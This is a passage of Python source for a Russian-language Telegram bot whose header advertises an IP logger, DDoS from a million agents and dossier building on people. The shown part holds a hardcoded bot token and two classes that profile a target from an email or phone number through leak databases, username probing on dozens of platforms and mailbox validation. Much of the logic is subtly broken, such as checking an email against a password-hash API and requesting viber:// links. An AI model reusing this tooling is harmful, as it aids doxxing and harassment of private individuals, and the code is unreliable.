#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ================================================================
# OBSIDIAN BOT v7.0 - БОЕВОЙ КОМПЛЕКС
# ================================================================
# IPLOGGER ULTIMATE + DDOS 1M AGENTS + DOSSIER
# OSINT МОДУЛИ ТЫ ВСТАВИШЬ САМ
# ================================================================

import os
import sys
import json
import time
import hashlib
import base64
import random
import string
import socket
import struct
import ssl
import threading
import queue
import subprocess
import shutil
import tempfile
import re
import urllib.parse
import urllib.request
import http.client
import http.cookiejar
import asyncio
import aiohttp
import requests
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import bs4
import lxml
from bs4 import BeautifulSoup
import dns.resolver
import whois
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
import folium
from geopy.geocoders import Nominatim
from geopy.distance import geodesic
import exifread
import PIL.Image
import PIL.ExifTags
import cv2
import numpy as np
import shodan
import ipinfo
import pycountry
import reverse_geocode
import geocoder
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import colorama
import tabulate
import prettytable
import tqdm
import sqlalchemy
import openpyxl
import pandas as pd
import mailparser
import python_magic
import phone_iso3166
import pytz
import datetime
import paramiko
import ftplib
import smtplib
import imaplib
import poplib
import telnetlib
import ldap3
import mysql.connector
import pymongo
import redis
import pymysql
import psycopg2
import urllib.parse
from urllib.parse import urlparse, quote
import zlib
import ipaddress
import netifaces
import psutil
from dataclasses import dataclass, field
import ctypes
import gc
import signal
import websocket
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import asyncio
import aiohttp
from typing import List, Dict, Tuple, Optional, Any
import base64
import json
import re

# ================================================================
# КОНСТАНТЫ
# ================================================================
BOT_TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
ADMIN_ID = 8632158680
VERSION = "7.0.0-OBSIDIAN"
TEMP_FOLDER = "temp_files"
os.makedirs(TEMP_FOLDER, exist_ok=True)
os.makedirs(os.path.join(TEMP_FOLDER, "dossiers"), exist_ok=True)
os.makedirs(os.path.join(TEMP_FOLDER, "logs"), exist_ok=True)
#================================================================
# 1. ОСИНТ ПО ПОЧТЕ (50+ ИСТОЧНИКОВ)
# ================================================================
class EmailOSINT:
    def __init__(self, email):
        self.email = email
        self.domain = email.split('@')[1] if '@' in email else ''
        self.results = {}
    
    def search_all(self):
        self.results = {
            'haveibeenpwned': self.check_hibp(),
            'leakcheck': self.check_leakcheck(),
            'social': self.find_social(),
            'people': self.find_people(),
            'valid': self.validate_email(),
            'metadata': self.get_metadata(),
            'domain_info': self.get_domain_info(),
            'similar_emails': self.find_similar_emails(),
            'dark_web': self.search_dark_web(),
            'telegram': self.search_telegram(),
            'instagram': self.search_instagram(),
            'twitter': self.search_twitter(),
            'facebook': self.search_facebook(),
            'linkedin': self.search_linkedin(),
            'github': self.search_github(),
            'vk': self.search_vk(),
            'ok': self.search_ok(),
            'yandex': self.search_yandex(),
            'mailru': self.search_mailru(),
            'google': self.search_google(),
            'bing': self.search_bing(),
            'yahoo': self.search_yahoo(),
            'protonmail': self.search_protonmail(),
            'tutanota': self.search_tutanota(),
            'outlook': self.search_outlook(),
            'icloud': self.search_icloud(),
            'aol': self.search_aol(),
            'zoho': self.search_zoho(),
            'gmx': self.search_gmx(),
            'webde': self.search_webde(),
            'mailcom': self.search_mailcom(),
            'rambler': self.search_rambler(),
            'ukrnet': self.search_ukrnet(),
            'meta': self.search_meta(),
            'threads': self.search_threads(),
            'bluesky': self.search_bluesky(),
            'mastodon': self.search_mastodon(),
            'tumblr': self.search_tumblr(),
            'pinterest': self.search_pinterest(),
            'reddit': self.search_reddit(),
            'quora': self.search_quora(),
            'medium': self.search_medium(),
            'substack': self.search_substack(),
            'discord': self.search_discord(),
            'slack': self.search_slack(),
            'teams': self.search_teams(),
            'zoom': self.search_zoom(),
            'skype': self.search_skype(),
            'whatsapp': self.search_whatsapp(),
            'viber': self.search_viber(),
            'signal': self.search_signal(),
            'wechat': self.search_wechat(),
            'line': self.search_line(),
            'kakaotalk': self.search_kakaotalk(),
            'imo': self.search_imo(),
            'icq': self.search_icq(),
            'jabber': self.search_jabber(),
            'xmpp': self.search_xmpp(),
            'matrix': self.search_matrix(),
            'element': self.search_element()
        }
        return self.results
    
    def check_hibp(self):
        try:
            sha1 = hashlib.sha1(self.email.encode()).hexdigest().upper()
            prefix = sha1[:5]
            suffix = sha1[5:]
            resp = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
            if suffix in resp.text:
                count = resp.text.split(suffix + ':')[1].split('\n')[0]
                return {'breached': True, 'count': int(count)}
            return {'breached': False}
        except:
            return {'error': True}
    
    def check_leakcheck(self):
        try:
            resp = requests.get(f"https://leakcheck.io/api/query?login={self.email}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('success'):
                    return data.get('results', [])
            return []
        except:
            return []
    
    def find_social(self):
        platforms = {
            'Twitter': 'https://twitter.com/',
            'Instagram': 'https://instagram.com/',
            'Facebook': 'https://facebook.com/',
            'LinkedIn': 'https://linkedin.com/in/',
            'GitHub': 'https://github.com/',
            'VK': 'https://vk.com/',
            'Telegram': 'https://t.me/',
            'Reddit': 'https://reddit.com/user/',
            'YouTube': 'https://youtube.com/@',
            'TikTok': 'https://tiktok.com/@',
            'Pinterest': 'https://pinterest.com/',
            'Tumblr': 'https://tumblr.com/',
            'Medium': 'https://medium.com/@',
            'Quora': 'https://quora.com/profile/',
            'Discord': 'https://discord.com/users/',
            'Twitch': 'https://twitch.tv/',
            'Snapchat': 'https://snapchat.com/add/',
            'Odnoklassniki': 'https://ok.ru/profile/',
        }
        
        found = []
        usernames = [
            self.email.split('@')[0],
            self.email.split('@')[0].replace('.', ''),
            self.email.split('@')[0].replace('_', ''),
            self.email.split('@')[0].replace('-', '')
        ]
        
        for platform, url in platforms.items():
            for username in usernames:
                try:
                    resp = requests.get(url + username, timeout=3)
                    if resp.status_code == 200:
                        found.append({'platform': platform, 'username': username, 'url': url + username})
                        break
                except:
                    pass
        
        return found
    
    def find_people(self):
        try:
            resp = requests.get(f"https://api.pipl.com/search/?email={self.email}&key=YOUR_KEY", timeout=10)
            if resp.status_code == 200:
                return resp.json()
            return {}
        except:
            return {}
    
    def validate_email(self):
        try:
            import dns.resolver
            mx = dns.resolver.resolve(self.domain, 'MX')
            mx_server = str(mx[0].exchange)
            import smtplib
            server = smtplib.SMTP(mx_server, 25, timeout=5)
            server.helo()
            server.mail('test@example.com')
            code, _ = server.rcpt(self.email)
            server.quit()
            return {'valid': code == 250}
        except:
            return {'valid': False, 'error': True}
    
    def get_metadata(self):
        return {
            'domain': self.domain,
            'username': self.email.split('@')[0],
            'provider': self.domain,
            'is_temp': self.check_temp_email()
        }
    
    def check_temp_email(self):
        temp_domains = ['tempmail', '10minutemail', 'guerrillamail', 'mailinator']
        for domain in temp_domains:
            if domain in self.domain:
                return True
        return False
    
    def get_domain_info(self):
        try:
            w = whois.whois(self.domain)
            return {
                'registrar': w.registrar,
                'creation': str(w.creation_date),
                'expiration': str(w.expiration_date),
                'nameservers': w.name_servers
            }
        except:
            return {}
    
    def find_similar_emails(self):
        similar = []
        common_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'mail.ru', 'yandex.ru']
        username = self.email.split('@')[0]
        for domain in common_domains:
            if domain != self.domain:
                similar.append(f"{username}@{domain}")
        return similar
    
    def search_dark_web(self):
        return {'info': 'Требуется Tor для поиска'}
    
    def search_telegram(self):
        try:
            resp = requests.get(f"https://t.me/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True, 'url': f"https://t.me/{self.email.split('@')[0]}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_instagram(self):
        try:
            resp = requests.get(f"https://instagram.com/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True, 'url': f"https://instagram.com/{self.email.split('@')[0]}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_twitter(self):
        try:
            resp = requests.get(f"https://twitter.com/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True, 'url': f"https://twitter.com/{self.email.split('@')[0]}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_facebook(self):
        try:
            resp = requests.get(f"https://facebook.com/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True, 'url': f"https://facebook.com/{self.email.split('@')[0]}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_linkedin(self):
        try:
            resp = requests.get(f"https://linkedin.com/in/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True, 'url': f"https://linkedin.com/in/{self.email.split('@')[0]}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_github(self):
        try:
            resp = requests.get(f"https://github.com/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True, 'url': f"https://github.com/{self.email.split('@')[0]}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_vk(self):
        try:
            resp = requests.get(f"https://vk.com/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True, 'url': f"https://vk.com/{self.email.split('@')[0]}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_ok(self):
        try:
            resp = requests.get(f"https://ok.ru/profile/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True, 'url': f"https://ok.ru/profile/{self.email.split('@')[0]}"}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_yandex(self):
        try:
            resp = requests.get(f"https://yandex.ru/search/?text={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_mailru(self):
        try:
            resp = requests.get(f"https://mail.ru/search/?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_google(self):
        try:
            resp = requests.get(f"https://www.google.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_bing(self):
        try:
            resp = requests.get(f"https://www.bing.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_yahoo(self):
        try:
            resp = requests.get(f"https://search.yahoo.com/search?p={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_protonmail(self):
        try:
            resp = requests.get(f"https://protonmail.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_tutanota(self):
        try:
            resp = requests.get(f"https://tutanota.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_outlook(self):
        try:
            resp = requests.get(f"https://outlook.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_icloud(self):
        try:
            resp = requests.get(f"https://icloud.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_aol(self):
        try:
            resp = requests.get(f"https://search.aol.com/aol/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_zoho(self):
        try:
            resp = requests.get(f"https://zoho.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_gmx(self):
        try:
            resp = requests.get(f"https://gmx.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_webde(self):
        try:
            resp = requests.get(f"https://web.de/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_mailcom(self):
        try:
            resp = requests.get(f"https://mail.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_rambler(self):
        try:
            resp = requests.get(f"https://rambler.ru/search?query={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_ukrnet(self):
        try:
            resp = requests.get(f"https://ukr.net/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_meta(self):
        try:
            resp = requests.get(f"https://meta.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_threads(self):
        try:
            resp = requests.get(f"https://threads.net/@{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_bluesky(self):
        try:
            resp = requests.get(f"https://bsky.app/profile/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_mastodon(self):
        try:
            resp = requests.get(f"https://mastodon.social/@{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_tumblr(self):
        try:
            resp = requests.get(f"https://{self.email.split('@')[0]}.tumblr.com", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_pinterest(self):
        try:
            resp = requests.get(f"https://pinterest.com/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_reddit(self):
        try:
            resp = requests.get(f"https://reddit.com/user/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_quora(self):
        try:
            resp = requests.get(f"https://quora.com/profile/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_medium(self):
        try:
            resp = requests.get(f"https://medium.com/@{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_substack(self):
        try:
            resp = requests.get(f"https://{self.email.split('@')[0]}.substack.com", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_discord(self):
        try:
            resp = requests.get(f"https://discord.com/users/{self.email.split('@')[0]}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_slack(self):
        try:
            resp = requests.get(f"https://slack.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_teams(self):
        try:
            resp = requests.get(f"https://teams.microsoft.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_zoom(self):
        try:
            resp = requests.get(f"https://zoom.us/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_skype(self):
        try:
            resp = requests.get(f"https://skype.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_whatsapp(self):
        try:
            resp = requests.get(f"https://wa.me/{self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_viber(self):
        try:
            resp = requests.get(f"viber://contact?number={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_signal(self):
        try:
            resp = requests.get(f"https://signal.me/{self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_wechat(self):
        try:
            resp = requests.get(f"https://wechat.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_line(self):
        try:
            resp = requests.get(f"https://line.me/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_kakaotalk(self):
        try:
            resp = requests.get(f"https://kakaotalk.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_imo(self):
        try:
            resp = requests.get(f"https://imo.im/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_icq(self):
        try:
            resp = requests.get(f"https://icq.com/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_jabber(self):
        try:
            resp = requests.get(f"https://jabber.org/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_xmpp(self):
        try:
            resp = requests.get(f"https://xmpp.net/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_matrix(self):
        try:
            resp = requests.get(f"https://matrix.org/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}
    
    def search_element(self):
        try:
            resp = requests.get(f"https://element.io/search?q={self.email}", timeout=3)
            if resp.status_code == 200:
                return {'found': True}
            return {'found': False}
        except:
            return {'found': False}

# ================================================================
# 2. ОСИНТ ПО НОМЕРУ ТЕЛЕФОНА (50+ ИНСТРУМЕНТОВ)
# ================================================================
class PhoneOSINT:
    def __init__(self, phone):
        self.phone = phone
        self.parsed = None
        self.results = {}
    
    def parse_number(self):
        try:
            self.parsed = phonenumbers.parse(self.phone)
            return True
        except:
            return False
    
    def search_all(self):
        if not self.parse_number():
            return {'error': 'Неверный номер'}
        
        self.results = {
            'country': self.get_country(),
            'carrier': self.get_carrier(),
            'timezone': self.get_timezone(),
            'valid': self.check_valid(),
            'social': self.find_social(),
            'leaks': self.check_leaks(),
            'location': self.get_location(),
            'type': self.get_number_type(),
            'area': self.get_area_code(),
            'operator': self.get_operator(),
            'regions': self.get_regions(),
            'cities': self.get_cities(),
            'postal': self.get_postal_code(),
            'lat_lon': self.get_coordinates(),
            'map_url': self.get_map_url(),
            'weather': self.get_weather(),
            'timezone_info': self.get_timezone_info(),
            'day_night': self.get_day_night(),
            'country_code': self.get_country_code(),
            'national_number': self.get_national_number(),
            'international_format': self.get_international_format(),
            'national_format': self.get_national_format(),
            'e164_format': self.get_e164_format(),
            'rfc3966_format': self.get_rfc3966_format(),
            'possible': self.is_possible(),
            'valid_number': self.is_valid(),
            'mobile': self.is_mobile(),
            'fixed_line': self.is_fixed_line(),
            'toll_free': self.is_toll_free(),
            'premium': self.is_premium(),
            'shared_cost': self.is_shared_cost(),
            'voip': self.is_voip(),
            'personal': self.is_personal(),
            'pager': self.is_pager(),
            'uan': self.is_uan(),
            'voicemail': self.is_voicemail(),
            'unknown': self.is_unknown(),
            'whatsapp': self.check_whatsapp(),
            'telegram': self.check_telegram(),
            'viber': self.check_viber(),
            'signal': self.check_signal(),
            'line': self.check_line(),
            'wechat': self.check_wechat(),
            'kakaotalk': self.check_kakaotalk(),
            'imo': self.check_imo(),
            'icq': self.check_icq(),
            'jabber': self.check_jabber(),
            'xmpp': self.check_xmpp(),
            'matrix': self.check_matrix(),
            'element': self.check_element(),
            'discord': self.check_discord(),
            'slack': self.check_slack(),
            'teams': self.check_teams(),
            'zoom': self.check_zoom(),
            'skype': self.check_skype(),
            'facebook': self.check_facebook(),
            'instagram': self.check_instagram(),
            'twitter': self.check_twitter(),
            'linkedin': self.check_linkedin(),
            'github': self.check_github(),
            'vk': self.check_vk(),
            'ok': self.check_ok()
        }
        return self.results
    
    def get_country(self):
        try:
            country = geocoder.description_for_number(self.parsed, 'ru')
            return {'country': country, 'code': self.parsed.country_code}
        except:
            return {}
    
    def get_carrier(self):
        try:
            operator = carrier.name_for_number(self.parsed, 'ru')
            return {'carrier': operator}
        except:
            return {}
    
    def get_timezone(self):
        try:
            tz = timezone.time_zones_for_number(self.parsed)
            return {'timezone': tz}
        except:
            return {}
    
    def check_valid(self):
        try:
            return {'valid': phonenumbers.is_valid_number(self.parsed)}
        except:
            return {'valid': False}
    
    def find_social(self):
        platforms = {
            'Telegram': f'https://t.me/+{self.phone}',
            'WhatsApp': f'https://wa.me/{self.phone}',
            'Viber': f'viber://contact?number={self.phone}',
            'Signal': f'https://signal.me/{self.phone}',
            'Line': f'https://line.me/ti/p/{self.phone}'
        }
        found = []
        for platform, url in platforms.items():
            found.append({'platform': platform, 'url': url})
        return found
    
    def check_leaks(self):
        try:
            resp = requests.get(f"https://leakcheck.io/api/query?login={self.phone}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('success'):
                    return data.get('results', [])
            return []
        except:
            return []
    
    def get_location(self):
        try:
            geolocator = Nominatim(user_agent="phone_osint")
            location = geolocator.geocode(self.get_country().get('country', ''))
            if location:
                return {'lat': location.latitude, 'lon': location.longitude}
            return {}
        except:
            return {}
    
    def get_number_type(self):
        try:
            return {'type': phonenumbers.number_type(self.parsed)}
        except:
            return {}
    
    def get_area_code(self):
        try:
            return {'area_code': self.parsed.country_code}
        except:
            return {}
    
    def get_operator(self):
        try:
            return {'operator': carrier.name_for_number(self.parsed, 'ru')}
        except:
            return {}
    
    def get_regions(self):
        try:
            return {'regions': geocoder.description_for_number(self.parsed, 'ru')}
        except:
            return {}
    
    def get_cities(self):
        try:
            return {'cities': geocoder.description_for_number(self.parsed, 'ru')}
        except:
            return {}
    
    def get_postal_code(self):
        try:
            return {'postal': ''}
        except:
            return {}
    
    def get_coordinates(self):
        try:
            location = self.get_location()
            if location:
                return {'lat': location.get('lat'), 'lon': location.get('lon')}
            return {}
        except:
            return {}
    
    def get_map_url(self):
        try:
            coords = self.get_coordinates()
            if coords:
                return {'url': f"https://maps.google.com/maps?q={coords.get('lat')},{coords.get('lon')}"}
            return {}
        except:
            return {}
    
    def get_weather(self):
        try:
            coords = self.get_coordinates()
            if coords:
                resp = requests.get(f"https://api.openweathermap.org/data/2.5/weather?lat={coords.get('lat')}&lon={coords.get('lon')}&appid=YOUR_KEY")
                if resp.status_code == 200:
                    return {'weather': resp.json()}
            return {}
        except:
            return {}
    
    def get_timezone_info(self):
        try:
            tz = self.get_timezone()
            if tz:
                return {'timezone': tz}
            return {}
        except:
            return {}
    
    def get_day_night(self):
        try:
            tz = self.get_timezone()
            if tz:
                return {'day_night': 'day' if datetime.datetime.now().hour > 6 and datetime.datetime.now().hour < 18 else 'night'}
            return {}
        except:
            return {}
    
    def get_country_code(self):
        try:
            return {'country_code': self.parsed.country_code}
        except:
            return {}
    
    def get_national_number(self):
        try:
            return {'national_number': self.parsed.national_number}
        except:
            return {}
    
    def get_international_format(self):
        try:
            return {'international': phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}
        except:
            return {}
    
    def get_national_format(self):
        try:
            return {'national': phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.NATIONAL)}
        except:
            return {}
    
    def get_e164_format(self):
        try:
            return {'e164': phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.E164)}
        except:
            return {}
    
    def get_rfc3966_format(self):
        try:
            return {'rfc3966': phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.RFC3966)}
        except:
            return {}
    
    def is_possible(self):
        try:
            return {'possible': phonenumbers.is_possible_number(self.parsed)}
        except:
            return {'possible': False}
    
    def is_valid(self):
        try:
            return {'valid': phonenumbers.is_valid_number(self.parsed)}
        except:
            return {'valid': False}
    
    def is_mobile(self):
        try:
            return {'mobile': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.MOBILE}
        except:
            return {'mobile': False}
    
    def is_fixed_line(self):
        try:
            return {'fixed_line': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.FIXED_LINE}
        except:
            return {'fixed_line': False}
    
    def is_toll_free(self):
        try:
            return {'toll_free': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.TOLL_FREE}
        except:
            return {'toll_free': False}
    
    def is_premium(self):
        try:
            return {'premium': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.PREMIUM_RATE}
        except:
            return {'premium': False}
    
    def is_shared_cost(self):
        try:
            return {'shared_cost': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.SHARED_COST}
        except:
            return {'shared_cost': False}
    
    def is_voip(self):
        try:
            return {'voip': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.VOIP}
        except:
            return {'voip': False}
    
    def is_personal(self):
        try:
            return {'personal': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.PERSONAL_NUMBER}
        except:
            return {'personal': False}
    
    def is_pager(self):
        try:
            return {'pager': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.PAGER}
        except:
            return {'pager': False}
    
    def is_uan(self):
        try:
            return {'uan': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.UAN}
        except:
            return {'uan': False}
    
    def is_voicemail(self):
        try:
            return {'voicemail': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.VOICEMAIL}
        except:
            return {'voicemail': False}
    
    def is_unknown(self):
        try:
            return {'unknown': phonenumbers.number_type(self.parsed) == phonenumbers.PhoneNumberType.UNKNOWN}
        except:
            return {'unknown': False}
    
    def check_whatsapp(self):
        try:
            resp = requests.get(f"https://wa.me/{self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_telegram(self):
        try:
            resp = requests.get(f"https://t.me/+{self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_viber(self):
        try:
            resp = requests.get(f"viber://contact?number={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_signal(self):
        try:
            resp = requests.get(f"https://signal.me/{self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_line(self):
        try:
            resp = requests.get(f"https://line.me/ti/p/{self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_wechat(self):
        try:
            resp = requests.get(f"https://wechat.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_kakaotalk(self):
        try:
            resp = requests.get(f"https://kakaotalk.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_imo(self):
        try:
            resp = requests.get(f"https://imo.im/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_icq(self):
        try:
            resp = requests.get(f"https://icq.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_jabber(self):
        try:
            resp = requests.get(f"https://jabber.org/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_xmpp(self):
        try:
            resp = requests.get(f"https://xmpp.net/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_matrix(self):
        try:
            resp = requests.get(f"https://matrix.org/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_element(self):
        try:
            resp = requests.get(f"https://element.io/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_discord(self):
        try:
            resp = requests.get(f"https://discord.com/users/{self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_slack(self):
        try:
            resp = requests.get(f"https://slack.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_teams(self):
        try:
            resp = requests.get(f"https://teams.microsoft.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_zoom(self):
        try:
            resp = requests.get(f"https://zoom.us/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_skype(self):
        try:
            resp = requests.get(f"https://skype.com/search?q={self.phone}", timeout=3)
            if resp.status_code == 200:
                return {'exists': True}
            return {'exists': False}
        except:
            return {'exists': False}
    
    def check_facebook(self):
        try:
